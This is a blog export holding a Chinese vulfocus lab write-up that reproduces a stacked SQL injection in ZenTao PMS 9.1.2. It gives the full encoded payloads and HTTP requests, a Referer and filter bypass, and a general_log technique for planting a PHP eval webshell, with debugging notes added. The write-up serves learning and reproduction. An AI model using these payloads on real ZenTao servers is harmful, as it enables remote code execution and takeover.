<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>禅道zentaopms-9.1.2-sql SQL注入</title>
    <link href="/2022/03/12/zentaopms_9.1.2_sql_SQL%E6%B3%A8%E5%85%A5/"/>
    <url>/2022/03/12/zentaopms_9.1.2_sql_SQL%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><h2 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h2><p><em>禅道 项目管理软件 是国产的开源项目管理软件,专注研发项目管理,内置需求管理、任务管理、bug管理、缺陷管理、用例管理、计划发布等功能,实现了软件的完整生命周期管理。 漏洞出现在zentao\lib\base\dao\dao.class.php中的orderBy函数没有对limit部分做任何限制就直接拼接。也就是说，使用了orderBy这个函数的地方都有可能产生过滤。</em></p><h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>该漏洞环境已整合到vulfocus靶场中，可一键直接启动。 </p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/zentaopms_9.1.2_sql_SQL%E6%B3%A8%E5%85%A5/Untitled.png" alt="Untitled"></p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><ol><li>获取目标版本信息：<a href="http://118.193.36.37:10363/zentaopms/www/index.php?mode=getconfig">http://118.193.36.37:10363/zentaopms/www/index.php?mode=getconfig</a><ol><li>{“version”:”9.1.2”,”requestType”:”GET”,”requestFix”:”-………………</li></ol></li><li>通过错误路由引发报错，进而获取服务器绝对路径：<a href="http://118.193.36.37:10363/zentaopms/www/index.php?m=user&amp;f=login1">http://118.193.36.37:10363/zentaopms/www/index.php?m=user&amp;f=login1</a><ol><li>/www/zentaopms/framework/base/router.class.php</li></ol></li><li>漏洞点：orderBy处理过程中存在SQL注入问题，可堆叠注入。拿其中一个payload演示编码步骤如下：<ol><li>选择所用payload语句：<code>select sleep(5)</code></li><li>将SQL语句hex编码：<code>0x73656c65637420736c656570283529</code></li><li>将hex编码后的参数插入json中：<code>&#123;&quot;orderBy&quot;:&quot;order limit 1;SET @SQL=0x73656c65637420736c656570283529;PREPARE pord FROM @SQL;EXECUTE pord;-- -&quot;,&quot;num&quot;:&quot;1,1&quot;,&quot;type&quot;:&quot;openedbyme&quot;&#125;</code></li><li>将json数据进行base64编码：<code>eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMTtTRVQgQFNRTD0weDczNjU2YzY1NjM3NDIwNzM2YzY1NjU3MDI4MzUyOTtQUkVQQVJFIHBvcmQgRlJPTSBAU1FMO0VYRUNVVEUgcG9yZDstLSAtIiwibnVtIjoiMSwxIiwidHlwZSI6Im9wZW5lZGJ5bWUifQ==</code></li><li>将base64编码后的数据插入请求：<a href="http://118.193.36.37:10363/zentaopms/www/index.php%EF%BC%9Fm=block&amp;f=main&amp;mode=getblockdata&amp;blockid=case&amp;param=eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMTtTRVQgQFNRTD0weDczNjU2YzY1NjM3NDIwNzM2YzY1NjU3MDI4MzUyOTtQUkVQQVJFIHBvcmQgRlJPTSBAU1FMO0VYRUNVVEUgcG9yZDstLSAtIiwibnVtIjoiMSwxIiwidHlwZSI6Im9wZW5lZGJ5bWUifQ==">http://118.193.36.37:10363/zentaopms/www/index.php%EF%BC%9Fm=block&amp;f=main&amp;mode=getblockdata&amp;blockid=case&amp;param=eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMTtTRVQgQFNRTD0weDczNjU2YzY1NjM3NDIwNzM2YzY1NjU3MDI4MzUyOTtQUkVQQVJFIHBvcmQgRlJPTSBAU1FMO0VYRUNVVEUgcG9yZDstLSAtIiwibnVtIjoiMSwxIiwidHlwZSI6Im9wZW5lZGJ5bWUifQ==</a></li><li>注：每一个请求中都需要手动添加refer字段：<code>Referer:http://118.193.36.37:10363/zentaopms/</code></li></ol></li><li>获取webshell过程的payload如下：（采用的是日志写shell的方式）<ol><li>开启日志：<code>set global general_log=&#39;on&#39;;</code> </li><li>更改日志路径：<code>set global general_log_file=&#39;/www/zentaopms/module/misc/ext/model/foo.php&#39;;</code> </li><li>注入shell语句：<code>select &#39;&lt;?php @eval($_POST[1])?&gt;&#39;;</code> </li><li>关闭日志:<code>set global general_log=&#39;off&#39;;</code></li></ol></li><li>访问webshell获取flag：链接：<a href="http://118.193.36.37:10363/zentaopms/module/misc/ext/model/foo.php">http://118.193.36.37:10363/zentaopms/module/misc/ext/model/foo.php</a> 密码：1</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//sleep（5）</span><br>GET /zentaopms/www/index.php?m=block&amp;f=main&amp;mode=getblockdata&amp;blockid=<span class="hljs-keyword">case</span>&amp;param=eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMTtTRVQgQFNRTD0weDczNjU2YzY1NjM3NDIwNzM2YzY1NjU3MDI4MzUyOTtQUkVQQVJFIHBvcmQgRlJPTSBAU1FMO0VYRUNVVEUgcG9yZDstLSAtIiwibnVtIjoiMSwxIiwidHlwZSI6Im9wZW5lZGJ5bWUifQ== HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">118.193</span>.<span class="hljs-number">36.37</span>:<span class="hljs-number">10363</span><br>Referer:http:<span class="hljs-comment">//118.193.36.37:10363/zentaopms/</span><br><br><span class="hljs-comment">//开启日志：set global general_log=&#x27;on&#x27;; </span><br>GET /zentaopms/www/index.php?m=block&amp;f=main&amp;mode=getblockdata&amp;blockid=<span class="hljs-keyword">case</span>&amp;param=eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMSwxO1NFVCBAU1FMPTB4NzM2NTc0MjA2NzZjNmY2MjYxNmMyMDY3NjU2ZTY1NzI2MTZjNWY2YzZmNjczZDI3NmY2ZTI3M2I7UFJFUEFSRSBwb3JkIEZST00gQFNRTDtFWEVDVVRFIHBvcmQ7LS0gLSIsIm51bSI6IjEsMSIsInR5cGUiOiJvcGVuZWRieW1lIn0= HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">118.193</span>.<span class="hljs-number">36.37</span>:<span class="hljs-number">10363</span><br>Referer:http:<span class="hljs-comment">//118.193.36.37:10363/zentaopms/</span><br><br><span class="hljs-comment">//更改日志路径：set global general_log_file=&#x27;/www/zentaopms/module/misc/ext/model/foo.php&#x27;; </span><br>GET /zentaopms/www/index.php?m=block&amp;f=main&amp;mode=getblockdata&amp;blockid=<span class="hljs-keyword">case</span>&amp;param=eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMSwxO1NFVCBAU1FMPTB4NzM2NTc0MjA2NzZjNmY2MjYxNmMyMDY3NjU2ZTY1NzI2MTZjNWY2YzZmNjc1ZjY2Njk2YzY1M2QyNzJmNzc3Nzc3MmY3YTY1NmU3NDYxNmY3MDZkNzMyZjZkNmY2NDc1NmM2NTJmNmQ2OTczNjMyZjY1Nzg3NDJmNmQ2ZjY0NjU2YzJmNjY2ZjZmMmU3MDY4NzAyNzNiO1BSRVBBUkUgcG9yZCBGUk9NIEBTUUw7RVhFQ1VURSBwb3JkOy0tIC0iLCJudW0iOiIxLDEiLCJ0eXBlIjoib3BlbmVkYnltZSJ9 HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">118.193</span>.<span class="hljs-number">36.37</span>:<span class="hljs-number">10363</span><br>Referer:http:<span class="hljs-comment">//118.193.36.37:10363/zentaopms/</span><br><br><span class="hljs-comment">//注入shell语句：select &#x27;<span class="hljs-meta">&lt;?php</span> @eval($_POST[1])<span class="hljs-meta">?&gt;</span>&#x27;;</span><br>GET /zentaopms/www/index.php?m=block&amp;f=main&amp;mode=getblockdata&amp;blockid=<span class="hljs-keyword">case</span>&amp;param=eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMSwxO1NFVCBAU1FMPTB4NzM2NTZjNjU2Mzc0MjAyNzNjM2Y3MDY4NzAyMDQwNjU3NjYxNmMyODI0NWY1MDRmNTM1NDViMzE1ZDI5M2YzZTI3M2I7UFJFUEFSRSBwb3JkIEZST00gQFNRTDtFWEVDVVRFIHBvcmQ7LS0gLSIsIm51bSI6IjEsMSIsInR5cGUiOiJvcGVuZWRieW1lIn0= HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">118.193</span>.<span class="hljs-number">36.37</span>:<span class="hljs-number">10363</span><br>Referer:http:<span class="hljs-comment">//118.193.36.37:10363/zentaopms/</span><br><br><span class="hljs-comment">//关闭日志:set global general_log=&#x27;off&#x27;;</span><br>GET /zentaopms/www/index.php?m=block&amp;f=main&amp;mode=getblockdata&amp;blockid=<span class="hljs-keyword">case</span>&amp;param=eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMSwxO1NFVCBAU1FMPTB4NzM2NTc0MjA2NzZjNmY2MjYxNmMyMDY3NjU2ZTY1NzI2MTZjNWY2YzZmNjczZDI3NmY2NjY2MjczYjtQUkVQQVJFIHBvcmQgRlJPTSBAU1FMO0VYRUNVVEUgcG9yZDstLSAtIiwibnVtIjoiMSwxIiwidHlwZSI6Im9wZW5lZGJ5bWUifQ== HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">118.193</span>.<span class="hljs-number">36.37</span>:<span class="hljs-number">10363</span><br>Referer:http:<span class="hljs-comment">//118.193.36.37:10363/zentaopms/</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/zentaopms_9.1.2_sql_SQL%E6%B3%A8%E5%85%A5/Untitled%201.png" alt="Untitled"></p><h2 id="简单描述"><a href="#简单描述" class="headerlink" title="简单描述"></a>简单描述</h2><ol><li>为什么不用select…into file方式getshell？网上教程绝大部分用这种方式，但是此靶场不行，详见后文select …into file处</li><li>为什么用哪个foo.php路径？因为只有特定的文件路径可以。详见后文general_log处的坑一坑二</li><li>为什么用预处理方式？系统有过滤一些敏感符号，预处理中可利用hex编码绕过，详见补充部分</li><li>为什么请求中一定要加refer？系统有校验这个请求头，详见补充部分</li></ol><h1 id="详细讲讲TL-DR"><a href="#详细讲讲TL-DR" class="headerlink" title="详细讲讲TL;DR"></a>详细讲讲TL;DR</h1><p>由于在线 Vulfocus的靶机存在时间限制，故选择自行搭建靶机。同时由于自行搭建，故可以进入靶机然后分析。</p><h2 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h2><ol><li>拉取官方镜像：<code>sudo docker pull vulfocus/zentaopms_9.1.2_sql</code></li><li>启动：<code>sudo docker run -dt --name zentao -p 8080:80 vulfocus/zentaopms_9.1.2_sql</code></li><li>访问：<code>IP+8080+/zentaopms/www/index.php</code></li><li>后台管理员账户：<code>admin/zxc@123</code></li></ol><h3 id="后文会用到的命令"><a href="#后文会用到的命令" class="headerlink" title="后文会用到的命令"></a>后文会用到的命令</h3><ol><li>进行docker内：<code>sudo docker exec -it xxxx /bin/bash</code></li><li>进入mysql：<code>mysql -u root -p</code>  。账户密码： <code>root/pass</code>,账户密码存于<code>/www/zentaopms/config/my.php</code></li><li>mysql命令：<ol><li>查看安全：<code>show variables like &#39;%secure%&#39;;</code></li><li>查看日志：<code>show variables like &#39;general_log%&#39;;</code></li><li>设置日志路径：<code>set global general_log_file=&#39;/var/lib/mysql/ac2ecb1e75dc.log&#39;;</code></li><li>设置日志开启：<code>set global general_log=&#39;on&#39;;</code></li></ol></li></ol><blockquote><p>trick: 由于payload要频繁base64编码，burpsuite中的trick：<code>Ctrl+B</code>→Base64编码，<code>Ctrl+Shift+B</code>→Base64解码</p></blockquote><h2 id="SELECT…INTO-OUTFILE方式失败"><a href="#SELECT…INTO-OUTFILE方式失败" class="headerlink" title="SELECT…INTO OUTFILE方式失败"></a>SELECT…INTO OUTFILE方式失败</h2><p>最早找到的文章<a href="https://www.freebuf.com/vuls/246678.html">《禅道免登陆SQL注入漏洞复现》</a>就是通过SELECT…INTO OUTFILE方式写入，但是发现怎么写入都不成功</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">payload--&gt;select <span class="hljs-string">&#x27;&lt;?php @eval($_POST[1])?&gt;&#x27;</span> into outfile <span class="hljs-string">&#x27;/www/zentaopms/www/1.php&#x27;</span><br>hex--&gt;<span class="hljs-number">0x73656c65637420273c3f70687020406576616c28245f504f53545b315d293f3e2720696e746f206f757466696c6520272f7777772f7a656e74616f706d732f7777772f312e70687027</span><br>params--&gt;&#123;<span class="hljs-string">&quot;orderBy&quot;</span>:<span class="hljs-string">&quot;order limit 1;SET @SQL=0x73656c65637420273c3f70687020406576616c28245f504f53545b315d293f3e2720696e746f206f757466696c6520272f7777772f7a656e74616f706d732f7777772f312e70687027;PREPARE pord FROM @SQL;EXECUTE pord;-- -&quot;</span>,<span class="hljs-string">&quot;num&quot;</span>:<span class="hljs-string">&quot;1,1&quot;</span>,<span class="hljs-string">&quot;type&quot;</span>:<span class="hljs-string">&quot;openedbyme&quot;</span>&#125;<br>base64--&gt;eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMTtTRVQgQFNRTD0weDczNjU2YzY1NjM3NDIwMjczYzNmNzA2ODcwMjA0MDY1NzY2MTZjMjgyNDVmNTA0ZjUzNTQ1YjMxNWQyOTNmM2UyNzIwNjk2ZTc0NmYyMDZmNzU3NDY2Njk2YzY1MjAyNzJmNzc3Nzc3MmY3YTY1NmU3NDYxNmY3MDZkNzMyZjc3Nzc3NzJmMzEyZTcwNjg3MDI3O1BSRVBBUkUgcG9yZCBGUk9NIEBTUUw7RVhFQ1VURSBwb3JkOy0tIC0iLCJudW0iOiIxLDEiLCJ0eXBlIjoib3BlbmVkYnltZSJ9<br></code></pre></td></tr></table></figure><h3 id="失败的原因"><a href="#失败的原因" class="headerlink" title="失败的原因"></a>失败的原因</h3><p><code>show variables like &#39;%secure%&#39;;</code>其中<code>secure_file_priv</code>会限制数据的导入导出操作。</p><p>（1）当<code>secure_file_priv</code>为空，就可以任意读取磁盘的目录。</p><p>（2）当<code>secure_file_priv</code>为path，就可以读取对应目录以及其子目录的文件。</p><p>（3）当<code>secure_file_priv</code>为null，不能加载文件。</p><p>故反馈到靶机上，查看下图，文件只能写入到<code>/var/lib/mysql-files</code>目录下。如将shell的写入路径改为<code>/var/lib/mysql-files/1.php</code>即可以写入shell，但是这种写入也只是鸡肋，无法利用</p><p>且<code>secure-file-priv</code>属于Server System Variables，无法通过SQL语句更改，只能通过更改系统配置文件的方式。故通过SELECT … INTO OUTFILE语句写入shell的方式在此靶机中行不通</p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/zentaopms_9.1.2_sql_SQL%E6%B3%A8%E5%85%A5/Untitled%202.png" alt="Untitled"></p><blockquote><p>trick：vulfocus的靶机提供了3306端口的对外映射，故可以直接链接</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/zentaopms_9.1.2_sql_SQL%E6%B3%A8%E5%85%A5/Untitled%203.png" alt="Untitled"></p><h2 id="sleep-验证漏洞存在"><a href="#sleep-验证漏洞存在" class="headerlink" title="sleep()验证漏洞存在"></a>sleep()验证漏洞存在</h2><blockquote><p>既然按照上述文章一把梭的方式失败，就只能最简单的<code>sleep()</code>开始验证漏洞存在，给自己点正面反馈</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/zentaopms_9.1.2_sql_SQL%E6%B3%A8%E5%85%A5/Untitled%204.png" alt="Untitled"></p><h2 id="报错尝试"><a href="#报错尝试" class="headerlink" title="报错尝试"></a>报错尝试</h2><blockquote><p>此处也是给自己的一个正反馈：延时盲注可行，写shell文件不行，于是尝试报错注入，看能否再给自己一个正反馈</p></blockquote><p>参考：L3m0n师傅<a href="https://zhuanlan.zhihu.com/p/34275981">《从SQL注入到Getshell：记一次禅道系统的渗透》</a> </p><p>构造:<code>&#123;&quot;orderBy&quot;:&quot;order limit 1&#39;&quot;,&quot;num&quot;:&quot;1,1&quot;,&quot;type&quot;:&quot;openedbyme&quot;&#125;</code> 其中1后面有个单引号，进而构成报错注入。很庆幸看到了报错信息，但遗憾无法根据报错进行注入。</p><p>关于为什么此处不用堆叠注入，L3m0n文中也提及：因为“limit后的注入点，因为使用多语句的话，报错效果不明显，所以就直接在limit后面进行注入”，而“limit的注入和mysql版本还有一些关系，目前网上的payload仅限于低版本才可报错注入出数据，很不幸运的是，目标使用的是高版本mysql”</p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/zentaopms_9.1.2_sql_SQL%E6%B3%A8%E5%85%A5/Untitled%205.png" alt="Untitled%205.png"></p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/zentaopms_9.1.2_sql_SQL%E6%B3%A8%E5%85%A5/Untitled%206.png" alt="Untitled"></p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/zentaopms_9.1.2_sql_SQL%E6%B3%A8%E5%85%A5/Untitled%207.png" alt="Untitled"></p><h2 id="general-log方式成功"><a href="#general-log方式成功" class="headerlink" title="general_log方式成功"></a>general_log方式成功</h2><p>general_log写入四部曲：</p><ol><li>开启日志：<code>set global general_log=&#39;on&#39;;</code> </li><li>更改日志路径：<code>set global general_log_file=&#39;/www/zentaopms/module/misc/ext/model/foo.php&#39;;</code> </li><li>注入shell语句：<code>select &#39;&lt;?php @eval($_POST[1])?&gt;&#39;;</code> </li><li>关闭日志:<code>set global general_log=&#39;off&#39;;</code></li></ol><p>注：我第四步选择关闭日志，因为实在不想所有的SQL语句都写入文件，进而导致shell文件过于冗杂</p><h3 id="坑一：mysql写入文件的权限问题"><a href="#坑一：mysql写入文件的权限问题" class="headerlink" title="坑一：mysql写入文件的权限问题"></a>坑一：mysql写入文件的权限问题</h3><p>我尝试随便写入文件到Web目录下，如<code>set global general_log_file=&#39;/www/zentaopms/www/test.php&#39;</code> ，但遗憾失败了，卡在了权限。</p><p>原因：执行SQL语句写入文件的是mysql用户，但是运行Web服务的是www-data用户</p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/zentaopms_9.1.2_sql_SQL%E6%B3%A8%E5%85%A5/Untitled%208.png" alt="Untitled%208.png"></p><h3 id="坑一解决方案"><a href="#坑一解决方案" class="headerlink" title="坑一解决方案"></a>坑一解决方案</h3><p>思路：找到一个mysql可以写入的,且www-data用户可以访问的php文件</p><p>方法：<code>find /www/zentaopms/ -perm 777 -type f</code>   </p><p>发现web目录下有这些文件可以写，初步排查一波，觉得<code>hello.test.php</code>可用</p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/zentaopms_9.1.2_sql_SQL%E6%B3%A8%E5%85%A5/Untitled%209.png" alt="Untitled"></p><h3 id="坑二：php标签闭合"><a href="#坑二：php标签闭合" class="headerlink" title="坑二：php标签闭合"></a>坑二：php标签闭合</h3><p><code>hello.test.php</code> 确实可以写入，web也确实可以访问，但是访问出错</p><p>我直接将写入的文件复制到本地环境访问，发现原因在于开启日志会写入一些信息，而这些信息不符合php语法故报错，即使是闭合了php标签。</p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/zentaopms_9.1.2_sql_SQL%E6%B3%A8%E5%85%A5/Untitled%2010.png" alt="Untitled%2010.png"></p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/zentaopms_9.1.2_sql_SQL%E6%B3%A8%E5%85%A5/Untitled%2011.png" alt="Untitled"></p><h3 id="坑二解决方案"><a href="#坑二解决方案" class="headerlink" title="坑二解决方案"></a>坑二解决方案</h3><p>继续再从上述权限为777类型的文件中找其他的闭合了标签的php文件，然后发现foo文件吻合。</p><p>故我的攻击路径采用的是<code>/www/zentaopms/module/misc/ext/model/foo.php</code> ，当然也有其他文件可以，但未每个尝试</p><blockquote><p>采用：<code>inurl:ext/model/foo.php</code> 语法进行搜索，疑似就是禅道默认都会有这个foo.php文件？未测试</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/zentaopms_9.1.2_sql_SQL%E6%B3%A8%E5%85%A5/Untitled%2012.png" alt="Untitled%2012.png"></p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/zentaopms_9.1.2_sql_SQL%E6%B3%A8%E5%85%A5/Untitled%2013.png" alt="Untitled%2013.png"></p><h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><h2 id="为什么要加refer字段"><a href="#为什么要加refer字段" class="headerlink" title="为什么要加refer字段"></a>为什么要加refer字段</h2><p>参考L3m0n师傅的文章，在9.1.2也就是靶场环境的/www/zentaopms/module/block/control.php文件中，在“*__construct中，$this-&gt;selfCall是在验证referer的值，如果为真的话则后面的if将不会进入die语句里面*”</p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/zentaopms_9.1.2_sql_SQL%E6%B3%A8%E5%85%A5/Untitled%2014.png" alt="Untitled"></p><h2 id="为什么用预处理"><a href="#为什么用预处理" class="headerlink" title="为什么用预处理"></a>为什么用预处理</h2><p>堆叠普通SQL语句，如<code>&#123;&quot;orderBy&quot;:&quot;order limit 1;select sleep(5)-- -&quot;,&quot;num&quot;:&quot;1,1&quot;,&quot;type&quot;:&quot;openedbyme&quot;&#125;</code>还是可以的，但是使用general_log方式，SQL语句中会用到下划线<code>_</code>，而<code>_</code>被过滤会造成SQL语句执行出现问题。</p><p>还是参考L3m0n师傅的文章，在9.1.2也就是靶场环境的/www/zentaopms/lib/base/dao/dao.class.php的orderby函数中可以看到，将“<em>下划线给过滤掉了，那这种在多语句下，可以利用mysql的预查询来绕过</em>”</p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/zentaopms_9.1.2_sql_SQL%E6%B3%A8%E5%85%A5/Untitled%2015.png" alt="Untitled"></p><h2 id="为什么general-log值可更改，secure-file-priv不行"><a href="#为什么general-log值可更改，secure-file-priv不行" class="headerlink" title="为什么general_log值可更改，secure_file_priv不行"></a>为什么general_log值可更改，secure_file_priv不行</h2><p>还是查看官方文档，<code>general_log</code>属于<a href="https://dev.mysql.com/doc/refman/5.7/en/dynamic-system-variables.html">Dynamic System Variables</a>，可以通过set来动态更改。而<code>secure_file_priv</code> 是<a href="https://dev.mysql.com/doc/refman/5.7/en/security-options.html">非动态的系统变量</a>，故不可以更改</p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/zentaopms_9.1.2_sql_SQL%E6%B3%A8%E5%85%A5/Untitled%2016.png" alt="Untitled"></p><h2 id="黑盒情况下如何判断secure-file-priv变量的值"><a href="#黑盒情况下如何判断secure-file-priv变量的值" class="headerlink" title="黑盒情况下如何判断secure_file_priv变量的值"></a>黑盒情况下如何判断secure_file_priv变量的值</h2><h3 id="根据系统信息"><a href="#根据系统信息" class="headerlink" title="根据系统信息"></a>根据系统信息</h3><blockquote><p>很多人搜到上面的内容就点到为止了，但远不于此</p></blockquote><p>查看了下<a href="https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_secure_file_priv">官方文档关于secure-file-priv的介绍</a> ：</p><p><code>secure-file-priv</code>的默认值因平台而异，取决于对应的CMake文件，默认如下图：</p><p>从图中可以看出windows取决于mysql版本，版本在5.7.16下可利用，而DEB, RPM, SLES, SVR4基本涵盖了绝大部分的linux，默认路径只在/var/lib/mysql-files，故linux下大概率不行</p><p>反馈到靶机环境上：网上采用load_file方式注入shell复现禅道的都在windows下故可行，而vulfucus中则在ubuntu下搭建环境，故无法利用</p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/zentaopms_9.1.2_sql_SQL%E6%B3%A8%E5%85%A5/Untitled%2017.png" alt="Untitled"></p><blockquote><p>注：文档中也提及mysql服务在启动的时候会根据<code>System variables</code> 设置相关配置 ，而由于<code>secure-file-priv</code> 是写在配置文件中的，故即使更改系统配置文件，也需要重启mysql服务才能使配置生效</p></blockquote><h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p><code>select @@secure_file_priv;</code> 或 <code>select @@global.secure_file_priv;</code></p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/zentaopms_9.1.2_sql_SQL%E6%B3%A8%E5%85%A5/Untitled%2018.png" alt="Untitled"></p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/zentaopms_9.1.2_sql_SQL%E6%B3%A8%E5%85%A5/Untitled%2019.png" alt="Untitled"></p><h2 id="查看mysql日志debug"><a href="#查看mysql日志debug" class="headerlink" title="查看mysql日志debug"></a>查看mysql日志debug</h2><p>查看mysql日志文件并且时刻刷新进而实现监控的效果： <code>tail -f /var/lib/mysql/ac2ecb1e75dc.log</code>  。<a href="https://www.runoob.com/linux/linux-comm-tail.html">Linux tail 命令</a></p><p>我通过debug找到坑点举例：</p><ol><li>尝试更改日志路径，但是总更改不了：<code>set global general_log_file=&#39;tmp/general.lg&#39;</code> </li><li>通过实时监控日志文件发现命令确实执行，但是就是执行不成功</li><li>将系统执行的命令复制到mysql中执行，发现文件路径少了一个“<code>/</code>”（mysql命令相对路径在/var/lib/mysql下，而该目录下tmp子目录不存在。mysql遇到文件不存在会创建，但遇到路径上的目录不存在则会出错）</li><li>更改后，即可成功<code>set global general_log_file=&#39;/tmp/general.lg&#39;</code></li></ol><p>注：关于为什么在路径中少了个<code>/</code> ，论网上教程的七宗罪</p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/zentaopms_9.1.2_sql_SQL%E6%B3%A8%E5%85%A5/Untitled%2020.png" alt="Untitled%2020.png"></p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/zentaopms_9.1.2_sql_SQL%E6%B3%A8%E5%85%A5/Untitled%2021.png" alt="Untitled"></p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/zentaopms_9.1.2_sql_SQL%E6%B3%A8%E5%85%A5/Untitled%2022.png" alt="Untitled%2022.png"></p><p><img src="https://cdn.jsdelivr.net/gh/corp0ra1/BlogPhoto/newBlogPhoto/zentaopms_9.1.2_sql_SQL%E6%B3%A8%E5%85%A5/Untitled%2023.png" alt="Untitled"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol><li>感谢<a href="https://ovi3.github.io/index.html">ovi3师傅</a>的指导</li><li>如何发现secure_file_priv在不同平台默认值？<ol><li>缘起：如果在黑盒情况下如何判断能否用load_file？</li><li>想法：我想试着通过盲注注出secure_file_priv变量的值，进而判断能否用load_file，找着找着然后就去看官方文档，进而发现了这个trick</li><li>反思：我们习惯从网上获取到二手的关于secure_file_priv变量设置为null、empty值对应的介绍，然后点到为止</li><li>教训：①多自我提问②多尝试获取一手信息，也许意外之喜</li></ol></li><li>沉下心<ol><li>发现 <code>general_log_file=&#39;tmp/general.lg&#39;</code> 报错之后，就只是简单的以为路径写错了罢了。经过ovi3师傅提醒，发现了错因的根本在于相对路径与绝对路径的区别</li><li>复现报错注入的时候测试payload是“<code>PROCEDURE ANALYSE(polygon(id),1)#</code>”，但实则我的环境中并没有这个id字段注入也不会得到想要的id内容，而我选择盲注复制L3m0n的payload以及其结论而快速跳过，而忽略了其用的是limit后的报错注入而不是之前的堆叠</li></ol></li><li>缺点<ol><li>代码审计篇幅没有展开，也没有深入研究。</li><li>对其他可写日志的php文件没有深入研究，并没有真正探索出共性，如foo.php文件在每个禅道版本是否都存在没有核实。</li></ol></li><li>自省：如果我没有靶机环境，我如何getshell?如何找到foo.php?如果实战遇到，我是否会放弃？</li></ol>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
      <tag>SQL注入</tag>
      
      <tag>mysql写日志</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>记一次不停自我追问式的学习</title>
    <link href="/2021/06/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/"/>
    <url>/2021/06/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%B8%8D%E5%81%9C%E8%87%AA%E6%88%91%E8%BF%BD%E9%97%AE%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/</url>
    
